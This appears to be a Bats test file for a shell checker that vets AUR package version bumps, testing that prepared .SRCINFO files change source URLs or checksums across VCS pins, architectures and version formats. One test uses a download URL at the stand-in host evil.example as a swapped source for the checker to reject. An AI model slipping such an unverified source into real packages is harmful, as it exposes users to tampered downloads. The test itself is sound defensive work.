@test "check_prepared_srcinfo: rejects a bump that changes only the name a download is saved under" {
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.0.0 "demo-1.0.0.zip::https://example.com/archive/363e794.zip" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.1.0 "demo-1.1.0.zip::https://example.com/archive/363e794.zip" "$H1"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO changes no source URL and no checksum"* ]]
}

@test "check_prepared_srcinfo: accepts a bump that changes the name and the URL of a download" {
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.0.0 "demo-1.0.0.zip::https://example.com/archive/v1.0.0.zip" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.1.0 "demo-1.1.0.zip::https://example.com/archive/v1.1.0.zip" "$H1"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 0 ]
}

# prepare hands over the AUR files when the AUR already has the version
@test "check_prepared_srcinfo: accepts the AUR copy itself" {
  local src="https://example.com/download/latest/player-x86_64.tar.zst"
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 6.00.3091 "$src" "$H1"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/old.SRCINFO" 6.00.3091
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: accepts a source without the version and a new checksum" {
  local src="https://example.com/download/latest/player-x86_64.tar.zst"
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 6.00.3091 "$src" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 6.00.3092 "$src" "$H3"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 6.00.3092
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: accepts a new source with the same checksum" {
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 2.0 "https://example.com/demo-2.0.tar.gz" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 2.1 "https://example.com/demo-2.1.tar.gz" "$H1"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.1
  [ "$status" -eq 0 ]
}

# makepkg fetches a VCS source at build time, and a local file keeps its hash
@test "check_prepared_srcinfo: accepts a VCS source and a local file that stay the same" {
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" r100.abc1234 \
    "demo::git+https://example.com/demo.git" SKIP demo.desktop "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" r101.def5678 \
    "demo::git+https://example.com/demo.git" SKIP demo.desktop "$H1"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" r101.def5678
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: accepts a download that stays the same with a SKIP checksum" {
  local src="https://example.com/releases/download/nightly/demo-linux.tar.gz"
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.0.0 "$src" SKIP
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.1.0 "$src" SKIP
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 0 ]
}

# A pin holds no version, so a bump that keeps it builds the old code
@test "check_prepared_srcinfo: rejects a bump that keeps a VCS source at its commit" {
  local src="git+https://example.com/demo.git?signed#commit=a2d30b96fbb026621ec11692272f0117f35a00fd"
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.11.0 "$src" SKIP
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.12.0 "$src" SKIP
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.12.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO changes no source URL and no checksum"* ]]
}

@test "check_prepared_srcinfo: rejects a bump that keeps any VCS pin" {
  local src sum
  for sum in SKIP "$H1"; do
    for src in "git://example.com/demo.git#tag=stable" \
      "demo::hg+https://example.com/demo#revision=42" \
      "svn+https://example.com/demo/trunk#revision=42" \
      "bzr+https://example.com/demo#revision=42" \
      "fossil+https://example.com/demo#commit=abc123" \
      "hg+https://example.com/demo#tag=stable"; do
      write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.0 "$src" "$sum"
      write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.1 "$src" "$sum"
      run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1
      [ "$status" -eq 1 ] || {
        echo "accepted: $src $sum"
        return 1
      }
      [[ "$output" == *"Prepared .SRCINFO changes no source URL and no checksum"* ]]
    done
  done
}

@test "check_prepared_srcinfo: accepts a VCS pin that follows the version" {
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.11.0 "git+https://example.com/demo.git#tag=v1.11.0" SKIP
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.12.0 "git+https://example.com/demo.git#tag=v1.12.0" SKIP
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.12.0
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: accepts a VCS source on a branch that stays the same" {
  local src="git+https://example.com/demo.git#branch=main"
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.11.0 "$src" SKIP
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.12.0 "$src" SKIP
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.12.0
  [ "$status" -eq 0 ]
}

# A second repository pinned to a commit, as a submodule often is, may stay
@test "check_prepared_srcinfo: accepts a VCS pin that stays when another source moves" {
  local sub="git+https://example.com/sub.git#commit=abc123"
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 49.0 \
    "git+https://example.com/demo.git#tag=49.0" SKIP "$sub" SKIP
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 51.1 \
    "git+https://example.com/demo.git#tag=51.1" SKIP "$sub" SKIP
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 51.1
  [ "$status" -eq 0 ]
}

# The archive of a fixed commit saved under the new version holds the old
# files, whatever another source does
@test "check_prepared_srcinfo: rejects a renamed download that keeps its URL and checksum next to a source that moves" {
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.4.0 \
    "player-1.4.0.zip::https://example.com/archive/0123abc.zip" "$H1" \
    "player.desktop::https://example.com/raw/v1.4.0/player.desktop" "$H2"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.5.0 \
    "player-1.5.0.zip::https://example.com/archive/0123abc.zip" "$H1" \
    "player.desktop::https://example.com/raw/v1.5.0/player.desktop" "$H3"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.5.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO line 4 saves the download of the old version under a new name: player-1.5.0.zip::https://example.com/archive/0123abc.zip"* ]]
}

@test "check_prepared_srcinfo: accepts a renamed download with a new checksum" {
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.4.0 \
    "player-1.4.0.tar.gz::https://example.com/latest/player.tar.gz" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.5.0 \
    "player-1.5.0.tar.gz::https://example.com/latest/player.tar.gz" "$H3"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.5.0
  [ "$status" -eq 0 ]
}

# A VCS pin keeps the rule of the whole file, whatever name it is saved under
@test "check_prepared_srcinfo: accepts a renamed VCS pin that stays next to a source that moves" {
  local pin="git+https://example.com/demo.git#commit=abc123"
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.4.0 \
    "demo-1.4.0::$pin" "$H1" "demo.desktop::https://example.com/raw/v1.4.0/demo.desktop" "$H2"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.5.0 \
    "demo-1.5.0::$pin" "$H1" "demo.desktop::https://example.com/raw/v1.5.0/demo.desktop" "$H3"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.5.0
  [ "$status" -eq 0 ]
}

# A dependency of a fixed version stays on every bump
# The 0.1 of pkgver after a digit in libbar-10.1, before a digit in
# libbaz-0.12 and after a dot in libqux-1.0.1
@test "check_prepared_srcinfo: keeps a version that is part of another number" {
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 0.1 "https://example.com/demo-0.1.tar.gz" "$H1" \
    "https://example.com/deps/libbar-10.1.tar.gz" "$H2" "https://example.com/deps/libbaz-0.12.tar.gz" "$H2" \
    "https://example.com/deps/libqux-1.0.1.tar.gz" "$H2"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 0.2 "https://example.com/demo-0.2.tar.gz" "$H3" \
    "https://example.com/deps/libbar-10.1.tar.gz" "$H2" "https://example.com/deps/libbaz-0.12.tar.gz" "$H2" \
    "https://example.com/deps/libqux-1.0.1.tar.gz" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 0.2
  [ "$status" -eq 0 ]
}

# The 2.0 of game-data is ${pkgver%.*} of 2.0.1 as well
@test "check_prepared_srcinfo: rejects a second source whose version is a form of pkgver" {
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 2.0.1 \
    "https://example.com/demo-2.0.1.tar.gz" "$H1" "https://example.com/game-data-2.0.tar.gz" "$H2"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 2.1.0 \
    "https://example.com/demo-2.1.0.tar.gz" "$H3" "https://example.com/game-data-2.0.tar.gz" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"line 5 is not the AUR source with the new version: source = https://example.com/game-data-2.0.tar.gz, expected source = https://example.com/game-data-2.1.tar.gz"* ]]
}

@test "check_prepared_srcinfo: accepts a hashed download that stays next to a source that moves" {
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.4.0 \
    "https://example.com/demo-1.4.0.tar.gz" "$H1" "https://example.com/deps/libbar-3.2.tar.gz" "$H2"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.5.0 \
    "https://example.com/demo-1.5.0.tar.gz" "$H3" "https://example.com/deps/libbar-3.2.tar.gz" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.5.0
  [ "$status" -eq 0 ]
}

# Helper: .SRCINFO with the given pkgver, a common source, and for each
# architecture its arch line and a source with its sha256sum. An empty
# source gives the arch line alone.
# Usage: write_srcinfo_archs <path> <pkgver> <common source> <common sum> [<arch> <source> <sha256sum>]...
write_srcinfo_archs() {
  local path=$1 pkgver=$2 common=$3 common_sum=$4 i
  shift 4
  {
    printf '%s\n' "pkgbase = demo" $'\tpkgver = '"$pkgver" $'\tpkgrel = 1'
    for ((i = 1; i <= $#; i += 3)); do
      printf '\tarch = %s\n' "${!i}"
    done
    if [[ -n "$common" ]]; then
      printf '\tsource = %s\n\tsha256sums = %s\n' "$common" "$common_sum"
    fi
    while (($# >= 3)); do
      if [[ -n "$2" ]]; then
        printf '\tsource_%s = %s\n\tsha256sums_%s = %s\n' "$1" "$2" "$1" "$3"
      fi
      shift 3
    done
    printf '%s\n' "" "pkgname = demo"
  } >"$path"
}

# _armver=2.2.9 builds the aarch64 source, so the aarch64 package would
# get the new version and the old files
@test "check_prepared_srcinfo: rejects an architecture whose sources and checksums all stay" {
  local arm="https://example.com/dl/v2.2.9/tool-2.2.9-aarch64.tar.gz"
  write_srcinfo_archs "$TEST_TMPDIR/old.SRCINFO" 2.3.0 "" "" \
    x86_64 "https://example.com/dl/v2.3.0/tool-2.3.0-x86_64.tar.gz" "$H1" aarch64 "$arm" "$H2"
  write_srcinfo_archs "$TEST_TMPDIR/new.SRCINFO" 2.4.0 "" "" \
    x86_64 "https://example.com/dl/v2.4.0/tool-2.4.0-x86_64.tar.gz" "$H3" aarch64 "$arm" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.4.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO changes no source URL and no checksum for aarch64, so the new version would hold the files of the old one"* ]]
}

# An architecture without sources of its own builds from the common ones
@test "check_prepared_srcinfo: rejects an architecture with only common sources that all stay" {
  local common="https://example.com/deps/libbar-3.2.tar.gz"
  write_srcinfo_archs "$TEST_TMPDIR/old.SRCINFO" 2.3.0 "$common" "$H2" \
    x86_64 "https://example.com/dl/v2.3.0/tool-2.3.0-x86_64.tar.gz" "$H1" aarch64 "" ""
  write_srcinfo_archs "$TEST_TMPDIR/new.SRCINFO" 2.4.0 "$common" "$H2" \
    x86_64 "https://example.com/dl/v2.4.0/tool-2.4.0-x86_64.tar.gz" "$H3" aarch64 "" ""
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.4.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO changes no source URL and no checksum for aarch64"* ]]
}

# The common sources count for every architecture
@test "check_prepared_srcinfo: accepts architectures whose own sources stay when a common source moves" {
  write_srcinfo_archs "$TEST_TMPDIR/old.SRCINFO" 2.3.0 "https://example.com/dl/tool-2.3.0.tar.gz" "$H1" \
    x86_64 "https://example.com/deps/helper-3.2-x86_64.tar.gz" "$H2" \
    aarch64 "https://example.com/deps/helper-3.2-aarch64.tar.gz" "$H4"
  write_srcinfo_archs "$TEST_TMPDIR/new.SRCINFO" 2.4.0 "https://example.com/dl/tool-2.4.0.tar.gz" "$H3" \
    x86_64 "https://example.com/deps/helper-3.2-x86_64.tar.gz" "$H2" \
    aarch64 "https://example.com/deps/helper-3.2-aarch64.tar.gz" "$H4"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.4.0
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: accepts architectures whose sources all move" {
  write_srcinfo_archs "$TEST_TMPDIR/old.SRCINFO" 2.3.0 "https://example.com/deps/libbar-3.2.tar.gz" "$H2" \
    x86_64 "https://example.com/dl/v2.3.0/tool-2.3.0-x86_64.tar.gz" "$H1" \
    aarch64 "https://example.com/dl/v2.3.0/tool-2.3.0-aarch64.tar.gz" "$H4"
  write_srcinfo_archs "$TEST_TMPDIR/new.SRCINFO" 2.4.0 "https://example.com/deps/libbar-3.2.tar.gz" "$H2" \
    x86_64 "https://example.com/dl/v2.4.0/tool-2.4.0-x86_64.tar.gz" "$H3" \
    aarch64 "https://example.com/dl/v2.4.0/tool-2.4.0-aarch64.tar.gz" "$H1"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.4.0
  [ "$status" -eq 0 ]
}

# pijul: pkgver 1.0.0.beta.11 with pkgver_dash ., the crate URL keeps the dash
@test "check_prepared_srcinfo: accepts a source with the dash that pkgver_dash replaced" {
  local url=https://static.crates.io/crates/pijul/pijul
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.0.0.beta.11 "pijul-1.0.0.beta.11.tar.gz::$url-1.0.0-beta.11.crate" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.0.0.beta.24 "pijul-1.0.0.beta.24.tar.gz::$url-1.0.0-beta.24.crate" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.0.0.beta.24 .
  [ "$status" -eq 0 ]
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.0.0.beta.24
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO line 4 is not the AUR source with the new version"* ]]
}

# nodejs-inshellisense: pkgver 0.0.1_rc.20 with pkgver_dash _, ${pkgver//_/-}
@test "check_prepared_srcinfo: accepts another line with the dash that pkgver_dash replaced" {
  local url=https://registry.npmjs.org/@microsoft/inshellisense/-/inshellisense
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 0.0.1_rc.20 "$url-0.0.1-rc.20.tgz" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 0.0.4 "$url-0.0.4.tgz" "$H2"
  sed -i $'/^\tsource = /a \tnoextract = inshellisense-0.0.1-rc.20.tgz' "$TEST_TMPDIR/old.SRCINFO"
  sed -i $'/^\tsource = /a \tnoextract = inshellisense-0.0.4.tgz' "$TEST_TMPDIR/new.SRCINFO"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 0.0.4 _
  [ "$status" -eq 0 ]
}

# pkgver_dash '', the token drop: pkgver 2.5.0rc1 for the tag v2.5.0-rc1
@test "check_prepared_srcinfo: accepts a source with the dash that pkgver_dash '' dropped" {
  local url=https://example.com/releases/download
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 2.5.0rc1 "$url/v2.5.0-rc1/demo-2.5.0-rc1.tgz" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 2.5.0 "$url/v2.5.0/demo-2.5.0.tgz" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.5.0 drop
  [ "$status" -eq 0 ]
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.5.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO line 4 is not the AUR source with the new version"* ]]
}

@test "check_prepared_srcinfo: rejects a dash dropped before the version with pkgver_dash ''" {
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 2.5.0rc1 "https://example.com/demo-2.5.0-rc1.tgz" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 2.5.0rc2 "https://example.com/demo2.5.0-rc2.tgz" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.5.0rc2 drop
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO line 4 is not the AUR source with the new version"* ]]
}

@test "check_prepared_srcinfo: rejects a dash outside the version with pkgver_dash ''" {
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 2.5.0rc1 "https://example.com/demo-2.5.0-rc1.tgz" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 2.5.0rc2 "https://example-com/demo-2.5.0-rc2.tgz" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 2.5.0rc2 drop
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO line 4 is not the AUR source with the new version"* ]]
}

@test "check_prepared_srcinfo: rejects another character in place of a dot with pkgver_dash" {
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 0.0.1_rc.20 "https://example.com/0.0.1-rc.20/demo.tgz" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 0.0.4 "https://example.com/0x0x4/demo.tgz" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 0.0.4 _
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO line 4 is not the AUR source with the new version"* ]]
}

# An empty pattern matches the empty string at every pass
@test "_undash_version: keeps the line for an empty version" {
  run timeout 10 bash -c 'source "$1/scripts/lib.sh"; _undash_version "demo-1-0" "" .' _ "$TEST_TMPDIR"
  [ "$status" -eq 0 ]
  [ "$output" = "demo-1-0" ]
}

@test "check_prepared_srcinfo: rejects a dash outside the version with pkgver_dash" {
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.0.0.beta.11 "https://static.crates.io/pijul-1.0.0-beta.11.crate" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 1.0.0.beta.24 "https://static-crates.io/pijul-1.0.0-beta.24.crate" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.0.0.beta.24 .
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO line 4 is not the AUR source with the new version"* ]]
}

# pkgver 4.4215 for build 4215 with pkgver_format '4.%s', and the build in
# the URL from ${pkgver#4.}
@test "check_prepared_srcinfo: accepts a source with the upstream version of pkgver_format" {
  local url=https://example.com/app_build
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 4.4215 "app_4_4215.tar.xz::${url}_4215_x64.tar.xz" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 4.4216 "app_4_4216.tar.xz::${url}_4216_x64.tar.xz" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 4.4216 "" '4.%s'
  [ "$status" -eq 0 ]
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 4.4216
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO line 4 is not the AUR source with the new version"* ]]
}

@test "check_prepared_srcinfo: rejects another number in place of the upstream version" {
  local url=https://example.com/app_build
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 4.4215 "${url}_4215_x64.tar.xz" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 4.4216 "${url}_4217_x64.tar.xz" "$H2"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 4.4216 "" '4.%s'
  [ "$status" -eq 1 ]
  [[ "$output" == *"Prepared .SRCINFO line 4 is not the AUR source with the new version"* ]]
}

@test "_unformat_version: prints the version inside the format" {
  source "$TEST_TMPDIR/scripts/lib.sh"
  run _unformat_version 4.4215 '4.%s'
  [ "$status" -eq 0 ]
  [ "$output" = "4215" ]
  run _unformat_version 2.0.1.git '%s.git'
  [ "$output" = "2.0.1" ]
}

@test "_unformat_version: prints nothing for a version outside the format" {
  source "$TEST_TMPDIR/scripts/lib.sh"
  run _unformat_version 3.4215 '4.%s'
  [ "$status" -eq 0 ]
  [ -z "$output" ]
  # Without %s, the format is both the text before and the text after it
  run _unformat_version 4.4 4
  [ -z "$output" ]
}

@test "check_prepared_srcinfo: accepts another line with the upstream version of pkgver_format" {
  local url=https://example.com/app_build
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 4.4215 "${url}_4215_x64.tar.xz" "$H1"
  write_srcinfo_sources "$TEST_TMPDIR/new.SRCINFO" 4.4216 "${url}_4216_x64.tar.xz" "$H2"
  sed -i $'/^\tsource = /a \tnoextract = app_build_4215_x64.tar.xz' "$TEST_TMPDIR/old.SRCINFO"
  sed -i $'/^\tsource = /a \tnoextract = app_build_4216_x64.tar.xz' "$TEST_TMPDIR/new.SRCINFO"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 4.4216 "" '4.%s'
  [ "$status" -eq 0 ]
}

# An empty form matches at every position and never moves on
@test "_bump_version: skips an empty upstream form" {
  run timeout 10 bash -c 'source "$1/scripts/lib.sh"; _bump_version "demo-1.0-1" 1.0 1.1 "" 2' _ "$TEST_TMPDIR"
  [ "$status" -eq 0 ]
  [ "$output" = "demo-1.1-1" ]
}

@test "check_prepared_srcinfo: accepts the AUR copy of a package with a VCS pin" {
  local src="git+https://example.com/demo.git#commit=abc123"
  write_srcinfo_sources "$TEST_TMPDIR/old.SRCINFO" 1.11.0 "$src" SKIP
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/old.SRCINFO" 1.11.0
  [ "$status" -eq 0 ]
}

# Helper: .SRCINFO of a nightly package with two sources, the first saved
# under <name>. <sums> gives the checksum arrays as array=checksum pairs,
# with the checksum of the first source; the second source has $H2.
# Usage: write_srcinfo_nightly <path> <pkgver> <name> <sums> [url]
write_srcinfo_nightly() {
  local url="${5:-https://example.com/releases/download/nightly/demo-linux.tar.gz}"
  local pair
  {
    printf '%s\n' "pkgbase = demo-nightly-bin" $'\tpkgver = '"$2" $'\tpkgrel = 1' \
      $'\tsource = '"$3::$url" $'\tsource = demo.vim'
    for pair in $4; do
      printf '\t%s = %s\n' "${pair%%=*}" "${pair#*=}" "${pair%%=*}" "$H2"
    done
    printf '%s\n' "" "pkgname = demo-nightly-bin"
  } >"$1"
}

@test "check_prepared_srcinfo: accepts new digits in the name of a SKIP source" {
  write_srcinfo_nightly "$TEST_TMPDIR/old.SRCINFO" 1.0.0 demo-20261014.tar.gz b2sums=SKIP
  write_srcinfo_nightly "$TEST_TMPDIR/new.SRCINFO" 1.1.0 demo-20261016.tar.gz b2sums=SKIP
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: rejects new letters in the name of a SKIP source" {
  write_srcinfo_nightly "$TEST_TMPDIR/old.SRCINFO" 1.0.0 demo-20261014.tar.gz b2sums=SKIP
  write_srcinfo_nightly "$TEST_TMPDIR/new.SRCINFO" 1.1.0 demo-oct16.tar.gz b2sums=SKIP
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"line 4 is not the AUR source with the new version"* ]]
}

@test "check_prepared_srcinfo: rejects a new URL for a SKIP source" {
  write_srcinfo_nightly "$TEST_TMPDIR/old.SRCINFO" 1.0.0 demo-20261014.tar.gz b2sums=SKIP
  write_srcinfo_nightly "$TEST_TMPDIR/new.SRCINFO" 1.1.0 demo-20261016.tar.gz b2sums=SKIP \
    https://evil.example/demo-linux.tar.gz
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"line 4 is not the AUR source with the new version"* ]]
}

@test "check_prepared_srcinfo: rejects new digits in the name of a hashed source" {
  write_srcinfo_nightly "$TEST_TMPDIR/old.SRCINFO" 1.0.0 demo-20261014.tar.gz "b2sums=$H1"
  write_srcinfo_nightly "$TEST_TMPDIR/new.SRCINFO" 1.1.0 demo-20261016.tar.gz "b2sums=$H3"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"line 4 is not the AUR source with the new version"* ]]
}

@test "check_prepared_srcinfo: rejects new digits when another checksum array has a hash" {
  write_srcinfo_nightly "$TEST_TMPDIR/old.SRCINFO" 1.0.0 demo-20261014.tar.gz "b2sums=SKIP sha256sums=$H1"
  write_srcinfo_nightly "$TEST_TMPDIR/new.SRCINFO" 1.1.0 demo-20261016.tar.gz "b2sums=SKIP sha256sums=$H3"
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 1 ]
  [[ "$output" == *"line 4 is not the AUR source with the new version"* ]]
}

# Helper: .SRCINFO of a nightly package with a generic source and an
# x86_64 source saved under <name>, and the checksums of each
# Usage: write_srcinfo_arch <path> <pkgver> <name> <generic sum> <x86_64 sum>
write_srcinfo_arch() {
  printf '%s\n' "pkgbase = demo-nightly-bin" $'\tpkgver = '"$2" $'\tpkgrel = 1' \
    $'\tsource = demo.vim' \
    $'\tsource_x86_64 = '"$3"'::https://example.com/releases/download/nightly/demo-x86_64.tar.gz' \
    $'\tb2sums = '"$4" $'\tb2sums_x86_64 = '"$5" "" "pkgname = demo-nightly-bin" >"$1"
}

@test "check_prepared_srcinfo: accepts new digits in the name of a SKIP arch source" {
  write_srcinfo_arch "$TEST_TMPDIR/old.SRCINFO" 1.0.0 demo-20261014.tar.gz "$H1" SKIP
  write_srcinfo_arch "$TEST_TMPDIR/new.SRCINFO" 1.1.0 demo-20261016.tar.gz "$H1" SKIP
  run check_prepared_srcinfo "$TEST_TMPDIR/old.SRCINFO" "$TEST_TMPDIR/new.SRCINFO" 1.1.0
  [ "$status" -eq 0 ]
}

@test "check_prepared_srcinfo: pairs an arch source with the checksums of its arch" {
  write_srcinfo_arch "$TEST_TMPDIR/old.SRCINFO" 1.0.0 demo-20261014.tar.gz SKIP "$H1"
